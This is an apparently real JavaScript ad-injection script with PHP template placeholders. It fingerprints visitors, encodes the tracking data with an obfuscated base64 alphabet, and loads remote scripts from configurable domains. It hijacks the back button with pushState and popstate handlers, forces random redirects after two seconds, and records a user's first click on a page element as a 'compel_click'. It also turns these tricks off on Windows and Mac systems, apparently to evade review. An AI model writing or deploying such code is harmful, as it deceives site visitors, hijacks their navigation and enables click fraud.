;(function() {

    var key = parseInt(Math.random() * 1000000);

    if (window[key] != undefined) return;

    var lh = window[key] = {};

    lh.$ = function(name)
    {
        if(name.substr(0,1)=='.')
        {
            return document.getElementsByClassName( name.substr(1) );
        }
        else if(name.substr(0,1)=='#')
        {
            return document.getElementById( name.substr(1) );
        }
        else
        {
            return document.getElementsByTagName('head');
        }
    };
    
    //cookie
    lh.getCookie = function(name)
    {
        var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");

        if(arr=document.cookie.match(reg)){
            return unescape(arr[2]);
        }else{
            return '';
        }
    };

    lh.setCookie = function(name, value, second)
    {
        var exp = new Date();
        exp.setTime( exp.getTime() + second*1000);
        document.cookie = name + "=" + escape (value) + ";expires=" + exp.toGMTString();
    };

    //class
    lh.Aclass = function(name, classname)
    {
        var ele = lh.$(name);

        if(name.substr(0,1)=='.')
        {
            for(index in ele)
            {
                if((parseInt(index) || index=='0'))
                {
                    if(!ele[index].className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
                    {
                        ele[index].className = ele[index].className+" "+classname;
                    }
                }
            }
        }
        if(name.substr(0,1)=='#')
        {
            if(!ele.className.match( new RegExp( "(\\s|^)"+classname+"(\\s|$)") ))
            {
                ele.className = ele.className+" "+classname;
            }
        }
    };
    
    lh.Rclass = function(name, classname)
    {
        var ele = lh.$(name);

        if(name.substr(0,1)=='.')
        {
            for(index in ele)
            {
                if((parseInt(index) || index=='0'))
                {
                    if(ele[index].className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
                    {
                        ele[index].className = ele[index].className.replace( new RegExp( "(\\s|^)" + classname + "(\\s|$)" ), "");
                    }
                }
            }
        }
        if(name.substr(0,1)=='#')
        {
            if(ele.className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
            {
                ele.className = ele.className.replace( new RegExp( "(\\s|^)" + classname + "(\\s|$)" ), "");
            }
        }
    };
    
    //加密
    lh.encode = function(k, e)
    {
        var t="";
        var n,r,i,s,o,u,a;
        var f=0;
        while(f<e.length)
        {
            n=e.charCodeAt(f++);
            r=e.charCodeAt(f++);
            i=e.charCodeAt(f++);
            s=n>>2;
            o=(n&3)<<4|r>>4;
            u=(r&15)<<2|i>>6;
            a=i&63;
            if(isNaN(r)){
                u=a=64;
            }else if(isNaN(i)){
                a=64;
            }
            t=t+k.charAt(s)+k.charAt(o)+k.charAt(u)+k.charAt(a);
        }
        return t;
    };
    
    //创建
    lh.CScript = function(url)
    {
        var script = document.createElement('script');
        script.src = url;
        document.body.appendChild(script);
    };

    //样式
    lh.Sstyle = function(D)
    {   
        
    };
    //打开
    lh.open = function(D)
    {
        var eve = event || window.event;

        var ip = lh.getCookie('is_repeat_ip_'+D.adid);
        var ips= new Array();
        ips = ip.split(':');

        var url = D.curl+"/pc?se="+D.string;
        var p = "refso=" + (window.DeviceOrientationEvent ? 1 : 0) + "_" + navigator.platform;
        p = p + "&url=" + encodeURIComponent(document.location);
        p = p + "&source=" + encodeURIComponent(document.referrer);
        p = p + "&screen=" + window.screen.width + "*" + window.screen.height;
        p = p + "&ifrom=" + (self!=top ? 1: 0);
        p = p + "&interval=" + parseInt((((new Date()).getTime())-D.time)/1000);
        p = p + "&history=" + history.length;
        p = p + "&ipnumber=" + ips.length;
        if(eve){
            if(eve.screenX>0 && eve.screenY>0){
                p = p + "&clickp=" + eve.screenX + "*" + eve.screenY;
            }else{
                p = p + "&clickp=0*0";
            }
        }else{
            p = p + "&clickp=0*0";
        }
        p = p + "&link=" + encodeURIComponent(D.link);
        p = p + "&ctype=" + D.type;
        p = p + "&jstime=" + parseInt((new Date()).getTime()/1000);
        url = url + "&sd=" + lh.encode(D.key, p);
        //url = url + "&"+p+"&t=" + Math.random();

        lh.CScript(url);
    };

    //返回跳转
    lh.rskip = function(D)
    {
        //直返
        if(D.click_return.state=='1' && parseInt(Math.random()*100)<D.click_return.chance)
        {
            if (!!(window.history && history.pushState))
            {
                window.addEventListener("popstate", function(event)
                {
                    var is_click_return = lh.getCookie('is_click_return');
                    if(!is_click_return)
                    {
                        lh.setCookie('is_click_return', '1', 3);
                        lh.setCookie('return_type', 'click_return', 15);
                        D.type = 'click_return';
                        lh.open(D);
                    }
                });
                window.history.pushState(null, null, null);
            }
        }
        //自返
        if(D.own_return.state=='1' && parseInt(Math.random()*100)<D.own_return.chance)
        {
            window.addEventListener('pageshow', function(e)
            {
                if (e.persisted || window.performance && window.performance.navigation.type == 2)
                {
                    var own_return_key = 'own_return_14';
                    var return_type = lh.getCookie('return_type');
                    var return_num = parseInt(lh.getCookie(own_return_key));

                    if(return_type=='click_return'){
                        if(return_num<=D.own_return.number || D.own_return.number==0)
                        {
                            lh.setCookie(own_return_key, return_num+1, 120);
                            D.type = 'own_return';
                            lh.open(D);
                        }
                    }
                }
            }, false);
        }
        //他返
        if(D.other_return.state=='1' && parseInt(Math.random()*100)<D.other_return.chance)
        {
            window.addEventListener('pageshow', function(e)
            {
                if (e.persisted || window.performance && window.performance.navigation.type == 2)
                {
                    var other_return_key = 'other_return_14';
                    var return_type = lh.getCookie('return_type');
                    var return_num = parseInt(lh.getCookie(other_return_key));

                    if(return_type!='click_return'){
                        if(return_num<=D.other_return.number || D.other_return.number==0)
                        {
                            lh.setCookie(other_return_key, return_num+1, 120);
                            D.type = 'other_return';
                            lh.open(D);
                        }
                    }
                }
            }, false);
        }
    };

    //强跳转
    lh.skip = function(D)
    {
        if(parseInt(Math.random() * 100)<D.skip)
        {
            setTimeout(function(){
                D.type = 'skip';
                lh.open(D);
            }, 2000);   
        }
    };

    //支口令
    lh.zhikl = function(D)
    {
        if(parseInt(Math.random() * 100) < D.zhikl)
        {
            
        }
    };

    //展示
    lh.show = function(D)
    {
        var ip = lh.getCookie('is_repeat_ip_'+D.adid);
        var num = 1;
        if( ip )
        {
            if(ip.indexOf(D.ip2long)>-1)
            {
                var num = 5;
            }
            else
            {
                var num = 1;
                ip = ip+':'+D.ip2long;
                lh.setCookie('is_repeat_ip_'+D.adid, ip, D.dis_time);
            }
        }
        else
        {
            var num = 1;
            ip = D.ip2long;
            lh.setCookie('is_repeat_ip_'+D.adid, ip, D.dis_time);
        }

        //获取IP数量
        var ips= new Array();
        ips = ip.split(':');

        //是否在ifrom中
        if (self!=top){
            var ifrom = 1;
        }else{
            var ifrom = 0;
        }
        
        if(parseInt(Math.random() * 100) < (100/num))
        {
            var url = D.purl+"/pv?se="+D.string;
            url = url + "&refso=" + (window.DeviceOrientationEvent ? 1 : 0)+"_"+navigator.platform+"_"+history.length;
            url = url + "&url=" + encodeURIComponent(document.location);
            url = url + "&source=" + encodeURIComponent(document.referrer);
            url = url + "&screen=" + window.screen.width + "*" + window.screen.height;
            url = url + "&n=" + num;
            url = url + "&ip=" + ips.length;
            url = url + "&ifrom=" + ifrom;
            url = url + "&time=" + Math.random();

            lh.CScript(url);
        }
    };
    //强点
    lh.ComCli = function(D)
    {
        if(window.navigator.cookieEnabled)
        {
            if(parseInt(Math.random() * 100)<D.com_cha)
            {
                var com_cli = lh.getCookie('com_cli_14');
                if(com_cli!='click' && D.com_cli=='1')
                {
                    lh.$('#s'+key).addEventListener("click", function(){
                        D.type = 'compel_click';
                        lh.open(D);
                        lh.Aclass('.s'+key, 'hi'+key);
                        lh.setCookie('com_cli_14', 'click', D.com_cli_inter*3600);
                    });

                    setTimeout(function(){
                        lh.Rclass('.s'+key, 'hi'+key);
                    }, 12000)
                }
            }
        }
    };

    //是否模拟器
    lh.IsMN = function()
    {
        if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0)
        {
            return true;
        }
        else
        {
            return false;
        }
    };

    //初始化
    lh.init = function(D)
    {
        //初始化JS参数
        D.user_agent = navigator.userAgent.toLowerCase();
        D.time = (new Date()).getTime();
        D.key = 'ZtKfUjbwiR90dm8BgsX4cQ7T5W6kDCHNYG1oyEzqpxrLlFSJPn3uMevhOaVI2A+/=';

        if(lh.IsMN())
        {
            D.hid_height = -1;
            D.com_cli = -1;
            D.skip = -1;
        }
        //else
        {
            lh.show(D);
            lh.Sstyle(D);
            lh.rskip(D);
            lh.skip(D);
            lh.zhikl(D);
            lh.ComCli(D);

            //如果填写统计代码则添加
            if(D.statis_code && parseInt(Math.random() * 100)<D.statis_code_ratio){
                lh.CScript(D.statis_code);
            }
        }
    };

    lh.Data = {
        purl: "<?php echo $purl_domain; ?>",
        curl: "<?php echo $curl_domain; ?>",
        string: "<?php echo $string; ?>",
        com_cli: "<?php echo $webmasterAd['compel_click']; ?>",
        com_cha: parseInt("<?php echo $webmasterAd['compel_chance']; ?>"),
        com_cli_inter: parseInt("<?php echo $webmasterAd['compel_interval']; ?>"),
        hid_height: parseInt("<?php echo $webmasterAd['hid_height']; ?>"),
        skip: parseInt("<?php echo $webmasterAd['compel_skip']; ?>"),
        click_return: JSON.parse('<?php echo $webmasterAd["click_return"]; ?>'),
        own_return: JSON.parse('<?php echo $webmasterAd["own_return"]; ?>'),
        other_return: JSON.parse('<?php echo $webmasterAd["other_return"]; ?>'),
        position: parseInt("<?php echo $webmasterAd['position']; ?>"),
        link: "<?php echo $advertiserAd['link']; ?>",
        adid: "<?php echo $webmasterAd['id']; ?>",
        statis_code: "<?php echo $webmasterAd['statis_code']; ?>",
        statis_code_ratio: parseInt("<?php echo $webmasterAd['statis_code_ratio']; ?>"),
        ip2long: "<?php echo ip2long(self::$client['ip']); ?>",
        dis_time: parseInt("<?php echo $distance_time; ?>"),
        time: parseInt("<?php echo $distance_time; ?>"),
    };

    
    lh.init(lh.Data);
})();